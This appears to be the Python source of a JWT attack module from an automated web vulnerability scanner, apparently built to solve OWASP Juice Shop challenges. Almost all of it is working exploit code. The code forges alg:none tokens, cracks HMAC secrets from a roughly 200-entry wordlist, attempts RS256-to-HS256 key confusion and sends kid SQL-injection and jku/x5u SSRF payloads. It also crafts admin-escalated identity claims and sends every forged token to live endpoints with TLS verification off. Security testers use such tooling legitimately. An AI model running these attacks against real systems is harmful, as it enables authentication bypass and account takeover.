"""
jwt_attack.py — JWT security analyzer (Burp JWT Editor equivalent).

Runs six attacks against JWT tokens found during classification:
  1. alg_none        — strip signature, change alg header
  2. alg_confusion   — RS256 → HS256 using public key as HMAC secret
  3. weak_secret     — crack HMAC secret from ~200-entry wordlist
  4. expired_accept  — set exp=0, probe if endpoint still accepts token
  5. kid_sqli        — SQL injection in the kid header claim
  6. jku_ssrf        — replace jku/x5u with OOB canary URL

Pipeline position: after classify, before verify.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass, field
from typing import Optional

import httpx

from classifier import Cat

# ---------------------------------------------------------------------------
# Weak secret wordlist (~200 common JWT secrets)
# ---------------------------------------------------------------------------

_WEAK_SECRETS: list[str] = [
    "secret", "password", "123456", "qwerty", "admin", "test", "abc123",
    "pass123", "secret123", "changeme", "letmein", "welcome", "monkey",
    "dragon", "master", "hello", "shadow", "sunshine", "princess", "login",
    "your-256-bit-secret", "your-secret", "jwt_secret", "supersecret",
    "my_secret", "jwt-secret", "jwtSecret", "JWT_SECRET", "app_secret",
    "application_secret", "django-insecure", "flask-secret", "rails-secret",
    "express-secret", "node-secret", "api_secret", "auth_secret",
    "signing_secret", "token_secret", "refresh_secret", "access_secret",
    "symmetric_key", "hmac_secret", "shared_secret", "private_secret",
    "1234567890", "0987654321", "password123", "admin123", "test123",
    "root", "toor", "pass", "passwd", "p@ssw0rd", "P@ssword", "P@ss123",
    "qwerty123", "abc", "abcdef", "abcdefg", "12345678", "123456789",
    "iloveyou", "trustno1", "sunshine", "princess", "welcome1", "password1",
    "pepper", "salt", "mysecret", "localdev", "development", "production",
    "staging", "testing", "debug", "demo", "example", "sample",
    "supersecretkey", "verysecretkey", "secretkey", "secrettoken",
    "randomsecret", "randomstring", "randomkey",
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "ffffffffffffffff",
    "0000000000000000", "1111111111111111",
    "secret_key", "SECRET_KEY", "SecretKey", "SECRETKEY",
    "auth_key", "AUTH_KEY", "token_key", "TOKEN_KEY",
    "jwt_key", "JWT_KEY", "hmac_key", "HMAC_KEY",
    "sign_key", "SIGN_KEY", "signing_key", "SIGNING_KEY",
    "app_key", "APP_KEY", "AppKey", "APPKEY",
    "private_key", "PRIVATE_KEY", "access_key", "ACCESS_KEY",
    "api_key", "API_KEY", "service_key", "SERVICE_KEY",
    "integration_key", "client_secret", "CLIENT_SECRET",
    "consumer_secret", "CONSUMER_SECRET",
    "super_secret", "ultra_secret", "mega_secret",
    "very_secret", "top_secret", "open_secret",
    "keyboard_cat", "hunter2", "correct_horse_battery_staple",
    "password!", "secret!", "admin!", "test!",
    "password#", "secret#", "admin#",
    # App-specific known defaults
    "shhhhh",           # OWASP Juice Shop
    "this is the secret",
    "s3cr3t",
    "secret sauce",
]

# JWT regex — three base64url segments
_JWT_RE = re.compile(
    r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
)


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class JWTFinding:
    attack_name: str
    original_token: str
    crafted_token: str
    endpoint: str
    method: str
    verdict: str        # "confirmed" | "likely" | "not_confirmed" | "skipped"
    confidence: float
    evidence: str
    cracked_secret: str = ""

    def to_dict(self) -> dict:
        return {
            "attack": self.attack_name,
            "endpoint": self.endpoint,
            "method": self.method,
            "verdict": self.verdict,
            "confidence": round(self.confidence, 2),
            "evidence": self.evidence,
            "crafted_token": self.crafted_token[:80] + "..." if len(self.crafted_token) > 80 else self.crafted_token,
            "cracked_secret": self.cracked_secret,
        }


@dataclass
class JWTAttackResult:
    tokens_tested: int = 0
    findings: list[JWTFinding] = field(default_factory=list)

    @property
    def confirmed(self) -> list[JWTFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    @property
    def actionable(self) -> list[JWTFinding]:
        return [f for f in self.findings if f.verdict in ("confirmed", "likely")]

    def to_dict(self) -> dict:
        return {
            "tokens_tested": self.tokens_tested,
            "confirmed": len(self.confirmed),
            "actionable": len(self.actionable),
            "findings": [f.to_dict() for f in self.findings],
        }


# ---------------------------------------------------------------------------
# JWT primitives (stdlib only — no PyJWT dependency)
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    padding = (4 - len(s) % 4) % 4
    return base64.urlsafe_b64decode(s + "=" * padding)


def _decode_part(segment: str) -> dict:
    return json.loads(_b64url_decode(segment))


def _encode_part(obj: dict) -> str:
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def _sign_hs(header_b64: str, payload_b64: str, secret: str, alg: str = "HS256") -> str:
    digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    digest = digest_map.get(alg, hashlib.sha256)
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, digest).digest()
    return _b64url_encode(sig)


def _forge_token(header: dict, payload: dict, secret: str = "", alg_override: str = "") -> str:
    """Build a signed (or unsigned for alg:none) JWT."""
    if alg_override:
        header = dict(header)
        header["alg"] = alg_override
    h = _encode_part(header)
    p = _encode_part(payload)
    alg = header.get("alg", "HS256")
    if alg.lower() == "none" or not secret:
        return f"{h}.{p}."
    return f"{h}.{p}.{_sign_hs(h, p, secret, alg)}"


def _split_token(token: str) -> Optional[tuple[dict, dict, str]]:
    """Split token into (header, payload, signature). Returns None on error."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return _decode_part(parts[0]), _decode_part(parts[1]), parts[2]
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Admin payload escalation helpers
# ---------------------------------------------------------------------------

_ADMIN_EMAILS = [
    "admin@juice-sh.op",
    "admin@example.com",
    "admin@admin.com",
    "admin",
]

_ADMIN_ROLES = ["admin", "administrator", "ADMIN", "superuser", "root"]


def _admin_payloads(payload: dict) -> list[dict]:
    """Generate admin-escalated JWT payload variants from a decoded payload.

    Handles both flat payloads (`payload.email`) and Juice Shop-style nested
    payloads (`payload.data.email`). Returns at most ~4 candidates.
    """
    candidates: list[dict] = []

    # Detect Juice Shop-style nested data wrapper: {status, data: {...}, iat}
    nested_data: Optional[dict] = None
    if isinstance(payload.get("data"), dict) and "email" in payload["data"]:
        nested_data = payload["data"]

    def _with_email(email: str) -> dict:
        if nested_data is not None:
            return {**payload, "data": {**nested_data, "email": email, "role": "admin"}}
        return {**payload, "email": email}

    # Email-based identity
    email_src = nested_data.get("email", "") if nested_data else payload.get("email", "")
    if email_src or nested_data is not None or "email" in payload:
        for email in _ADMIN_EMAILS:
            if email != email_src:
                candidates.append(_with_email(email))
        candidates = candidates[:2]

    # Role/scope claim escalation (flat payload only — nested handled above)
    if nested_data is None:
        for role_claim in ("role", "roles", "scope", "group", "type"):
            if role_claim in payload:
                for role in _ADMIN_ROLES:
                    if role != payload.get(role_claim):
                        candidates.append({**payload, role_claim: role})
                        break

    # sub-based identity
    if "sub" in payload and str(payload["sub"]) not in ("1", "admin"):
        candidates.append({**payload, "sub": "1"})

    return candidates or [{**payload}]


# ---------------------------------------------------------------------------
# Main analyzer
# ---------------------------------------------------------------------------

class JWTAnalyzer:
    """
    Extracts JWTs from classifier findings and cookie findings,
    then runs all applicable attacks against each token/endpoint pair.
    """

    def __init__(
        self,
        auth_headers: Optional[dict] = None,
        timeout: float = 6.0,
        canary=None,        # Optional[Canary] from canary.py
        max_tokens: int = 20,
        grabbed_key_files: Optional[list] = None,  # list[GrabbedFile] from file_grabber
    ):
        self.auth_headers = auth_headers or {}
        self.timeout = timeout
        self.canary = canary
        self.max_tokens = max_tokens
        # Pre-extract PEM key material from files the grabber already downloaded.
        # Keyed by source URL so _try_alg_confusion can cite where it came from.
        self._grabbed_keys: list[tuple[str, str]] = []  # (key_material, source_url)
        _KEY_EXTS = {".pem", ".pub", ".key", ".crt", ".cer", ".csr", ".asc"}
        for gf in (grabbed_key_files or []):
            if gf.extension not in _KEY_EXTS:
                continue
            try:
                content = open(gf.path, "r", errors="replace").read()
            except OSError:
                continue
            if "BEGIN" in content:
                self._grabbed_keys.append((content, gf.url))

    async def run(self, request_findings: list, cookie_findings: list) -> JWTAttackResult:
        """
        Collect JWT tokens from Auth/Session findings and cookie findings,
        then run all attacks.
        """
        result = JWTAttackResult()
        token_endpoint_pairs: list[tuple[str, str, str]] = []  # (token, url, method)

        # Extract from request findings
        for f in request_findings:
            if Cat.AUTH not in f.categories:
                continue
            auth = (f.headers or {}).get("authorization", "")
            if auth.lower().startswith("bearer "):
                token = auth.split(" ", 1)[1].strip()
                if _JWT_RE.match(token):
                    token_endpoint_pairs.append((token, f.url, f.method))

        # Extract JWTs from response bodies — login endpoints return tokens in
        # their responses; scanning the request body here was a bug (we sent
        # the credentials, not the token).
        for f in request_findings:
            resp_str = getattr(f, "response_body", None) or ""
            for m in _JWT_RE.finditer(resp_str):
                tok = m.group(0)
                # Pair with the same URL only if it's an auth-type endpoint;
                # otherwise we'd probe the login POST with the forged token,
                # which is meaningless.  Tag for _attack_token to use a sensible
                # probe endpoint derived from what was crawled.
                token_endpoint_pairs.append((tok, f.url, f.method))

        # Extract from cookie findings
        for cf in cookie_findings:
            if cf.is_jwt and cf.source_url:
                # Re-scan the source response body isn't accessible here,
                # but the cookie value is not stored in CookieFinding (by design).
                # We flag the endpoint for manual JWT testing via evidence.
                pass

        # Deduplicate by token
        seen: set[str] = set()
        unique_pairs: list[tuple[str, str, str]] = []
        for tok, url, method in token_endpoint_pairs:
            if tok not in seen:
                seen.add(tok)
                unique_pairs.append((tok, url, method))

        result.tokens_tested = len(unique_pairs[:self.max_tokens])
        if not unique_pairs:
            return result

        async with httpx.AsyncClient(
            verify=False,
            timeout=self.timeout,
            follow_redirects=True,
        ) as client:
            tasks = [
                self._attack_token(client, tok, url, method)
                for tok, url, method in unique_pairs[:self.max_tokens]
            ]
            all_findings = await asyncio.gather(*tasks, return_exceptions=True)

        for item in all_findings:
            if isinstance(item, list):
                result.findings.extend(item)

        return result

    async def _attack_token(
        self,
        client: httpx.AsyncClient,
        token: str,
        endpoint: str,
        method: str,
    ) -> list[JWTFinding]:
        parsed = _split_token(token)
        if not parsed:
            return []
        header, payload, _sig = parsed
        findings: list[JWTFinding] = []

        # Baseline: what does the original token return?
        baseline_status = await self._probe_status(client, endpoint, method, token)

        # 1. alg:none — try with original payload, then with identity-escalated variants
        alg_none_confirmed = False
        for alg_val in ("none", "None", "NONE"):
            crafted = _forge_token(header, payload, secret="", alg_override=alg_val)
            status = await self._probe_status(client, endpoint, method, crafted)
            if status == baseline_status and status in (200, 201):
                findings.append(JWTFinding(
                    attack_name="alg_none",
                    original_token=token,
                    crafted_token=crafted,
                    endpoint=endpoint,
                    method=method,
                    verdict="confirmed",
                    confidence=0.95,
                    evidence=f"alg:{alg_val} token accepted by endpoint (→ {status})",
                ))
                alg_none_confirmed = True
                break
            elif status not in (401, 403):
                findings.append(JWTFinding(
                    attack_name="alg_none",
                    original_token=token,
                    crafted_token=crafted,
                    endpoint=endpoint,
                    method=method,
                    verdict="likely",
                    confidence=0.5,
                    evidence=f"alg:{alg_val} returned {status} (not rejected with 401/403) — verify manually",
                ))
                alg_none_confirmed = True
                break

        # When alg:none is accepted, also forge with escalated identity claims.
        # This probes whether the server will accept a forged identity, not just
        # an unsigned token — required to trigger challenge-tracker checkpoints
        # in apps like Juice Shop that watch for forged-user requests.
        if alg_none_confirmed:
            for admin_payload in _admin_payloads(payload):
                admin_crafted = _forge_token(header, admin_payload, secret="", alg_override="none")
                admin_status = await self._probe_status(client, endpoint, method, admin_crafted)
                if admin_status in (200, 201):
                    findings.append(JWTFinding(
                        attack_name="alg_none_identity_forge",
                        original_token=token,
                        crafted_token=admin_crafted,
                        endpoint=endpoint,
                        method=method,
                        verdict="confirmed",
                        confidence=0.95,
                        evidence=f"alg:none + identity forge accepted (→ {admin_status})",
                    ))
                    break

        # 2. Weak secret crack
        cracked = self._crack_weak_secret(token, header)
        if cracked is not None:
            crafted = _forge_token(header, payload, secret=cracked)
            status = await self._probe_status(client, endpoint, method, crafted)
            verdict = "confirmed" if status == baseline_status and status not in (401, 403) else "likely"
            findings.append(JWTFinding(
                attack_name="weak_secret",
                original_token=token,
                crafted_token=crafted,
                endpoint=endpoint,
                method=method,
                verdict=verdict,
                confidence=0.9 if verdict == "confirmed" else 0.7,
                evidence=f"HMAC secret cracked: {cracked!r} — token re-forged",
                cracked_secret=cracked,
            ))

            # Forge admin-escalated tokens and probe — this is what triggers
            # challenge scoreboards (e.g. Juice Shop jwtForgedChallenge requires
            # changing email to admin@juice-sh.op or role claim to admin).
            admin_candidates = _admin_payloads(payload)
            for admin_payload in admin_candidates:
                admin_crafted = _forge_token(header, admin_payload, secret=cracked)
                admin_status = await self._probe_status(client, endpoint, method, admin_crafted)
                if admin_status in (200, 201):
                    findings.append(JWTFinding(
                        attack_name="weak_secret_admin_forge",
                        original_token=token,
                        crafted_token=admin_crafted,
                        endpoint=endpoint,
                        method=method,
                        verdict="confirmed",
                        confidence=0.95,
                        evidence=(
                            f"HMAC secret {cracked!r} — forged admin token accepted (→ {admin_status}): "
                            f"email={admin_payload.get('email','')!r} role={admin_payload.get('role','')!r}"
                        ),
                        cracked_secret=cracked,
                    ))
                    break

        # 3. Expired token acceptance
        mod_payload = dict(payload)
        mod_payload["exp"] = 1  # epoch 1970-01-01
        alg = header.get("alg", "HS256")
        if alg.lower().startswith("hs"):
            # Without the secret we can't re-sign — try alg:none variant
            crafted = _forge_token({**header, "alg": "none"}, mod_payload)
        else:
            crafted = _forge_token(header, mod_payload)
        status = await self._probe_status(client, endpoint, method, crafted)
        if status == baseline_status and status in (200, 201):
            findings.append(JWTFinding(
                attack_name="expired_accept",
                original_token=token,
                crafted_token=crafted,
                endpoint=endpoint,
                method=method,
                verdict="confirmed",
                confidence=0.9,
                evidence=f"Expired token (exp=1) accepted by endpoint (→ {status})",
            ))

        # 4. kid SQL injection
        if "kid" in header:
            sqli_payloads = [
                "' UNION SELECT 'hxxpsin'--",
                "../../dev/null",
                "/dev/null",
            ]
            for pl in sqli_payloads:
                sqli_header = {**header, "kid": pl}
                crafted = _forge_token(sqli_header, payload)
                status = await self._probe_status(client, endpoint, method, crafted)
                if status not in (400, 401, 403, 422, 500):
                    findings.append(JWTFinding(
                        attack_name="kid_sqli",
                        original_token=token,
                        crafted_token=crafted,
                        endpoint=endpoint,
                        method=method,
                        verdict="likely",
                        confidence=0.6,
                        evidence=f"kid={pl!r} → {status} (unexpected — verify SQL injection manually)",
                    ))
                    break

        # 5. jku/x5u SSRF
        for claim in ("jku", "x5u"):
            if claim in header and self.canary:
                canary_url = self.canary.generate(f"jwt-{claim}")
                if canary_url:
                    ssrf_header = {**header, claim: canary_url}
                    crafted = _forge_token(ssrf_header, payload)
                    await self._probe_status(client, endpoint, method, crafted)
                    hits = await self.canary.poll(timeout=4.0)
                    if hits:
                        findings.append(JWTFinding(
                            attack_name="jku_ssrf",
                            original_token=token,
                            crafted_token=crafted,
                            endpoint=endpoint,
                            method=method,
                            verdict="confirmed",
                            confidence=0.95,
                            evidence=f"{claim} SSRF confirmed via OOB callback from {hits[0].remote_address}",
                        ))

        # 6. alg confusion (RS256 → HS256) — only attempt if JWKS endpoint discoverable
        if header.get("alg", "").startswith("RS"):
            jwks_result = await self._try_alg_confusion(client, token, header, payload, endpoint, method, baseline_status)
            if jwks_result:
                findings.append(jwks_result)

        return findings

    async def _try_alg_confusion(
        self,
        client: httpx.AsyncClient,
        token: str,
        header: dict,
        payload: dict,
        endpoint: str,
        method: str,
        baseline_status: int,
    ) -> Optional[JWTFinding]:
        """
        RS256 → HS256 key confusion.

        Key material comes from two organic sources only — no hardcoded paths:
          1. JWKS JSON pointed to by the jku header claim (if present)
          2. PEM/key files already downloaded by file_grabber (self._grabbed_keys)
             — the grabber finds these by crawling the app normally; we just
             filter its output for files with key extensions.
        """
        from urllib.parse import urlparse
        key_sources: list[tuple[str, str]] = []  # (key_material, source_url)

        # 1. jku claim — the token itself tells us where the key is
        jku = header.get("jku", "")
        if jku:
            try:
                resp = await client.get(jku, timeout=4.0)
                if resp.status_code == 200:
                    ct = resp.headers.get("content-type", "")
                    body = resp.text.lstrip()
                    if "json" in ct or body.startswith("{"):
                        keys = resp.json().get("keys", [])
                        for k in keys[:2]:
                            key_sources.append((json.dumps(k, separators=(",", ":")), jku))
                    elif "BEGIN" in body:
                        key_sources.append((body, jku))
            except Exception:
                pass

        # 2. PEM/key files discovered and downloaded by file_grabber
        key_sources.extend(self._grabbed_keys)

        if not key_sources:
            return None

        payload_variants = [payload] + _admin_payloads(payload)
        for key_material, source_url in key_sources:
            for pv in payload_variants[:3]:
                crafted = _forge_token({**header, "alg": "HS256"}, pv,
                                       secret=key_material, alg_override="HS256")
                status = await self._probe_status(client, endpoint, method, crafted)
                if status in (200, 201):
                    return JWTFinding(
                        attack_name="alg_confusion",
                        original_token=token,
                        crafted_token=crafted,
                        endpoint=endpoint,
                        method=method,
                        verdict="confirmed",
                        confidence=0.9,
                        evidence=(
                            f"RS256→HS256 confusion: public key from {source_url} "
                            f"used as HMAC secret, endpoint accepted forged token (→ {status})"
                        ),
                    )
        return None

    def _crack_weak_secret(self, token: str, header: dict) -> Optional[str]:
        """Try _WEAK_SECRETS wordlist. Returns cracked secret or None."""
        alg = header.get("alg", "HS256")
        if not alg.lower().startswith("hs"):
            return None
        parts = token.split(".")
        if len(parts) != 3:
            return None
        msg = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = parts[2]
        digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        digest = digest_map.get(alg, hashlib.sha256)
        for secret in _WEAK_SECRETS:
            sig = _b64url_encode(hmac.new(secret.encode(), msg, digest).digest())
            if sig == expected_sig:
                return secret
        return None

    async def _probe_status(
        self,
        client: httpx.AsyncClient,
        endpoint: str,
        method: str,
        token: str,
    ) -> int:
        """Send request with crafted token, return HTTP status code."""
        try:
            resp = await client.request(
                method,
                endpoint,
                headers={**self.auth_headers, "Authorization": f"Bearer {token}"},
            )
            return resp.status_code
        except Exception:
            return 0
